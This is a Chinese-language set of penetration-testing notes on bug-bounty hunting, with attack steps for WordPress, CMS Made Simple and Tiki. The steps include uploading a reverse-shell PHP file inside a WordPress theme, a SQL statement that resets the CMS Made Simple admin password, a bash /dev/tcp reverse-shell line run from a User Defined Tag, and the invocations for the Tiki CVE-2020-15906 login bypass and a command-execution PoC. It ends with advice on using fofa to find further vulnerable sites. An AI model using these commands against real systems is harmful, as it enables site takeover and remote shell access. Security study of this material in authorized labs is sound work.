渗透测试经验分享
========================================

漏洞平台思路
----------------------------------------
- 注册账号
	| 补天、漏洞盒子等。
- 挖掘公益SRC
	| 公益SRC是白帽子随机发现的漏洞提交漏洞盒子平台，平台对漏洞审核后通知企业认领。厂商注册公益SRC成功后即可认领漏洞，公益SRC服务不收取企业任何费用。
- 步骤
	- 网站语言、操作系统、数据库版本
	- 网站有没有用CMS
	- 可能存在的漏洞
	- 确定登录页面

wordpress
----------------------------------------
- 扫描插件和主题是否包含漏洞
- 拿到wp网站登录用户名和密码
	- 可通过上传主题文件来getshell，首先先去官网下载一个主题压缩包，之后将反弹shell的php代码写入shell.php中，然后将其放入压缩包一起上传
	- shell目录：/wp-content/themes/[主题名]/[shell文件名]
- xmlrpc.php
	- 查看支持的方案
	
	::
	
		POST /xmlrpc.php HTTP/1.1
		Host: 192.168.100.106
		User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
		Content-Type: text/xml;charset=UTF-8
		Content-Length: 128

		<?xml version="1.0" encoding="iso-8859-1"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>

CMS Made Simple
-----------------------------------------
- 数据库更改密码方法
	+ 前提：登录数据库
	+ ``update cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name='sitemask'),''),'admin'))) where username = 'admin';``
- 反弹shell
	+ 前提：登录系统
	+ Extensions/User Defined Tags
		::
			
			vps开启监听
			修改任何一个tag的code，点击apply，点击run
			echo system("bash -c 'bash -i >& /dev/tcp/192.168.100.108/4444 0>&1'");
			
tiki
----------------------------------------
- CVE-2020-15906
	+ 利用条件：tiki<21.2
	+ 免密码登录
		::
		
			https://www.exploit-db.com/exploits/48927
			python 48927.py 192.168.100.103
			打开burpsuite，开启拦截
			浏览器登录admin，输入密码
			bp去掉密码，forward
			
	+ 命令执行
		::
		
			https://srcincite.io/pocs/cve-2021-26119.py.txt
			python cve-2021-26119.py 192.168.100.103 /tiki/ whoami
			

通用型漏洞挖掘
-----------------------------------------
- 发现通用型漏洞
	- 自己发掘站点通用型漏洞
	- 根据cvnd等公布的漏洞进行环境搭建和浮现
- 编写POC
- 挖掘漏洞站点
	- 漏洞站点包含的链接，url特征
	- fofa等站点搜索相似站点